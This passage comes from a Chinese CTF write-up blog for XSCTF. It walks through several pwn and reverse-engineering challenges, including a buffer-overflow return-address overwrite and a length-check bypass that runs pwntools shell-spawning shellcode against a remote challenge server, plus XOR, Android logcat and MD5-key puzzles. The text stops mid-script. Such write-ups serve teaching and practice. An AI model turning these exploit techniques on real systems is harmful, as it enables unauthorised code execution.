process(&#x27;./rock_paper_scissors&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">30480</span>)</span><br><span class="line"><span class="comment"># print(list(p64(0xe5b39fe7)+p64(0xb4a4)))</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0xe5b39fe7</span>)+p64(<span class="number">0xb4a4</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4012db</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125;</code></p><h2 id="toolong"><a href="#toolong" class="headerlink" title="toolong"></a>toolong</h2><p><code>一个字节能解决的shellcode，就不要用两个字节！</code></p><p>程序两次接收用户输入，其中第二次应该输入shellcode，之后程序会将用户输入的shellcode直接执行，但是题目限制了输入shellcode的长度（24）</p><p>题目给的可执行文件反汇编失败，估计是将字符串地址作为函数地址直接调用导致的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:000055A4CE79820E public main</span><br><span class="line">.text:000055A4CE79820E main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E s&#x3D; byte ptr -150h</span><br><span class="line">.text:000055A4CE79820E buf&#x3D; byte ptr -50h</span><br><span class="line">.text:000055A4CE79820E var_8&#x3D; dword ptr -8</span><br><span class="line">.text:000055A4CE79820E var_4&#x3D; dword ptr -4</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000</span><br><span class="line">.text:000055A4CE79820E endbr64</span><br><span class="line">.text:000055A4CE798212 push    rbp</span><br><span class="line">.text:000055A4CE798213 mov     rbp, rsp</span><br><span class="line">.text:000055A4CE798216 sub     rsp, 150h</span><br><span class="line">.text:000055A4CE79821D mov     eax, 0</span><br><span class="line">.text:000055A4CE798222 call    init</span><br><span class="line">.text:000055A4CE798227 mov     [rbp+var_8], 1</span><br><span class="line">.text:000055A4CE79822E lea     rax, s                          ; &quot;Welcome to XSCTF&quot;</span><br><span class="line">.text:000055A4CE798235 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798238 call    _puts</span><br><span class="line">.text:000055A4CE79823D lea     rax, [rbp+buf]</span><br><span class="line">.text:000055A4CE798241 mov     edx, 81                         ; nbytes</span><br><span class="line">.text:000055A4CE798246 mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798249 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE79824E call    _read</span><br><span class="line">.text:000055A4CE798253 lea     rax, aInputYourMagic            ; &quot;input your magic code:&quot;</span><br><span class="line">.text:000055A4CE79825A mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE79825D call    _puts</span><br><span class="line">.text:000055A4CE798262 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798269 mov     edx, 256                        ; nbytes</span><br><span class="line">.text:000055A4CE79826E mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798271 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE798276 call    _read</span><br><span class="line">.text:000055A4CE79827B mov     [rbp+var_4], eax</span><br><span class="line">.text:000055A4CE79827E cmp     [rbp+var_4], 0</span><br><span class="line">.text:000055A4CE798282 jg      short loc_55A4CE79828B</span><br><span class="line">.text:000055A4CE798284 mov     eax, 0</span><br><span class="line">.text:000055A4CE798289 jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE79828B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE79828B</span><br><span class="line">.text:000055A4CE79828B loc_55A4CE79828B:                       ; CODE XREF: main+74↑j</span><br><span class="line">.text:000055A4CE79828B lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798292 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798295 call    _strlen</span><br><span class="line">.text:000055A4CE79829A mov     edx, [rbp+var_8]</span><br><span class="line">.text:000055A4CE79829D movsxd  rdx, edx</span><br><span class="line">.text:000055A4CE7982A0 cmp     rax, rdx</span><br><span class="line">.text:000055A4CE7982A3 ja      short loc_55A4CE7982BA</span><br><span class="line">.text:000055A4CE7982A5 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982AC mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982AF call    _strlen</span><br><span class="line">.text:000055A4CE7982B4 cmp     rax, 24</span><br><span class="line">.text:000055A4CE7982B8 jbe     short loc_55A4CE7982D0</span><br><span class="line">.text:000055A4CE7982BA</span><br><span class="line">.text:000055A4CE7982BA loc_55A4CE7982BA:                       ; CODE XREF: main+95↑j</span><br><span class="line">.text:000055A4CE7982BA lea     rax, aTooLong                   ; &quot;too long!&quot;</span><br><span class="line">.text:000055A4CE7982C1 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982C4 call    _puts</span><br><span class="line">.text:000055A4CE7982C9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982CE jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE7982D0</span><br><span class="line">.text:000055A4CE7982D0 loc_55A4CE7982D0:                       ; CODE XREF: main+AA↑j</span><br><span class="line">.text:000055A4CE7982D0 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982D7 call    rax</span><br><span class="line">.text:000055A4CE7982D9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982DE</span><br><span class="line">.text:000055A4CE7982DE locret_55A4CE7982DE:                    ; CODE XREF: main+7B↑j</span><br><span class="line">.text:000055A4CE7982DE                                         ; main+C0↑j</span><br><span class="line">.text:000055A4CE7982DE leave</span><br><span class="line">.text:000055A4CE7982DF retn</span><br><span class="line">.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E</span><br><span class="line">.text:000055A4CE7982DF main endp</span><br></pre></td></tr></table></figure><p>值得注意的点是程序接收了两次用户输入<br>而在接收了两次输入之后程序会对输入进行两次检查</p><ol><li>在调用read函数之后，程序使用strlen函数将输入的长度存储在rax中，接着程序会将rax与栈上的一个值进行比较，如果rax大于该值就不会执行shellcode</li><li>第二次是与一个固定值（24）比较，如果大于这个值就不会执行shellcode</li></ol><p>其中第一次栈上的值其实可以通过第一次的输入修改，这样就可以绕过这次比较<br>而第二次的比较需要在写入的payload中使用%00作为分隔符，分开正常输入和shellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./toolong&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30510</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;z&#x27;</span>*<span class="number">80</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(p64(<span class="number">0x1234</span>)+shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125;</code></p><h2 id="Lets-go-to-xor"><a href="#Lets-go-to-xor" class="headerlink" title="Lets_go_to_xor"></a>Lets_go_to_xor</h2><p><code>只是一个超级Eazzzzzzzzzzy的Go程序,Let&#39;s Go!</code></p><p>使用golang编写编译的可执行文件<br><strong>其主函数在<code>main.main</code>中</strong></p><p>进入<code>main.main</code>找到<code>main.decode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main_decode@&lt;rax&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+12h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v1 != qword_C86F18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((__int64)i % <span class="number">10</span>) &gt;= <span class="number">0xA</span> )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( qword_C86F18 &lt;= i )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然和C语言不太一样，但是还是可以勉强看出来逻辑，大概就是下面这个意思</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>找到<code>main_enc</code>和<code>aIL0veCtf</code>，提取数据，将<code>main_enc</code>与<code>aIL0veCtf</code>循环异或就可以得到flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;i_l0ve_CtF&#x27;</span></span><br><span class="line">s = [<span class="number">0x0F</span>, <span class="number">0x33</span>, <span class="number">0x0D</span>, <span class="number">0x57</span>, <span class="number">0x0D</span>, <span class="number">0x3D</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x21</span>, <span class="number">0x17</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x0F</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x24</span>, <span class="number">0x6B</span>, <span class="number">0x1F</span>, <span class="number">0x64</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(<span class="built_in">chr</span>((s[i]^<span class="built_in">ord</span>(key[i%<span class="number">10</span>]))&amp;<span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125;</code></p><h2 id="loglistening"><a href="#loglistening" class="headerlink" title="loglistening"></a>loglistening</h2><p>题目下发一个安装包<br>jadx打开看到如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.loglistening;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.loglistening.databinding.ActivityMainBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">fasheng</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;loglistening&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="keyword">this</span>.binding = inflate;</span><br><span class="line">        setContentView((View) inflate.getRoot());</span><br><span class="line">        ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;好像有什么事情在native层发生了!&quot;</span>);</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.fasheng();</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;flag已经生成了！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是通过native层的代码生成的flag<br>找到so文件扔进ida，找到flag的生成代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Java_com_example_loglistening_MainActivity_fasheng</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  md5(<span class="string">&quot;stardustduststar&quot;</span>, v1);</span><br><span class="line">  __android_log_print(<span class="number">4L</span>L, <span class="string">&quot;xilo&quot;</span>, <span class="string">&quot;flag&#123;%s&#125;&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按道理说把字符串md5之后就可以得到flag了，但是失败了</p><p>看到log字样，直接查日志</p><ul><li>模拟器开启开发者选项</li><li>adb devices确认连接成功</li><li>输入<code>adb logcat -v time&gt;D:log.txt</code>开始抓取日志，期间打开软件点击按钮生成flag</li><li>然后返回命令行Ctrl+C完成抓取</li><li>找到log.txt查看日志<del>（虽然命令写的在D盘，但是实际上是在当前目录）</del></li></ul><p><code>flag&#123;4724110e8c8a83c123d6df82efee8c53&#125;</code></p><h2 id="picchange"><a href="#picchange" class="headerlink" title="picchange"></a>picchange</h2><p><code>输入数字即可得到flag哦</code></p><p>一开始想的是直接扔进ida反编译然后看对图像的加密逻辑，也就是下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_7FF6B8023C20</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *Stream; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  FILE *Streama; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="keyword">void</span> *Buffer; <span class="comment">// [rsp+68h] [rbp+48h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  sub_7FF6B80213C0(&amp;unk_7FF6B8036017);</span><br><span class="line">  Stream = fopen(a1, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    v4 = ftell(Stream);</span><br><span class="line">    fseek(Stream, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    Buffer = <span class="built_in">malloc</span>(v4);</span><br><span class="line">    <span class="keyword">if</span> ( Buffer )</span><br><span class="line">    &#123;</span><br><span class="line">      fread(Buffer, <span class="number">1u</span>i64, v4, Stream);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">        *((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br><span class="line">      Streama = fopen(<span class="string">&quot;picc_xor.png&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( Streama )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(Buffer, <span class="number">1u</span>i64, v4, Streama);</span><br><span class="line">        fclose(Streama);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">        sub_7FF6B80211CC(&amp;unk_7FF6B802CFB8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        perror(&amp;byte_7FF6B802CFA8);</span><br><span class="line">        <span class="built_in">free</span>(Buffer);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(&amp;byte_7FF6B802CF80);</span><br><span class="line">      fclose(Stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(&amp;ErrMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是对图像文件的每一个字节都进行了异或运算，但是异或的对象是不确定的<br>在交叉引用到最原始的变量以及动态调试之后得出结论：使用的是输入的三位数字的md5值作为key，对图像文件进行循环异或的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Stack[00001C64]:0000003589DCF5A8 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5A9 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5AA db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5AB db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5AC db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5AD db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5AE db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5AF db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5B0 db  61h ; a</span><br><span class="line">Stack[00001C64]:0000003589DCF5B1 db  63h ; c</span><br><span class="line">Stack[00001C64]:0000003589DCF5B2 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B3 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B4 db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5B5 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5B6 db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5B7 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5B8 db  39h ; 9</span><br><span class="line">Stack[00001C64]:0000003589DCF5B9 db  36h ; 6</span><br><span class="line">Stack[00001C64]:0000003589DCF5BA db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5BB db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5BC db  30h ; 0</span><br><span class="line">Stack[00001C64]:0000003589DCF5BD db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5BE db  31h ; 1</span><br><span class="line">Stack[00001C64]:0000003589DCF5BF db  35h ; 5</span><br><span class="line">Stack[00001C64]:0000003589DCF5C0 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C1 db  64h ; d</span><br><span class="line">Stack[00001C64]:0000003589DCF5C2 db  32h ; 2</span><br><span class="line">Stack[00001C64]:0000003589DCF5C3 db  33h ; 3</span><br><span class="line">Stack[00001C64]:0000003589DCF5C4 db  34h ; 4</span><br><span class="line">Stack[00001C64]:0000003589DCF5C5 db  62h ; b</span><br><span class="line">Stack[00001C64]:0000003589DCF5C6 db  37h ; 7</span><br><span class="line">Stack[00001C64]:0000003589DCF5C7 db  30h ; 0</span><br></pre></td></tr></table></figure><p>这段数据就是输入的测试数据<code>123</code>对应的md5值，而为了解密图像，输入的key需要满足一定条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入你的key： 123</span><br><span class="line">MD5 的前三位数字与 key的本身值 不相等。注:数字范围为0--9</span><br></pre></td></tr></table></figure><p>这里需要注意的主要是<code>数字范围为0--9</code>指的是输入的key还是md5的值，还是两者皆是<br>答案是只有输入的key，因为作为循环异或的对象长度应该是一定的，而如果转换为十进制的话原本的md5编码的长度可能会变化，这一点也可以在先前对图像加密的代码中得出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*((_BYTE *)Buffer + i) ^= strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)(i % <span class="number">32</span> + a2), <span class="number">0</span>i64, <span class="number">16</span>);</span><br></pre></td></tr></table></figure><p>可以看到也是以32为周期的</p><p>所以现在的问题就是找到某三位数字，其md5的值的前三位与原本的值是相等的</p><p>生成正确的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span 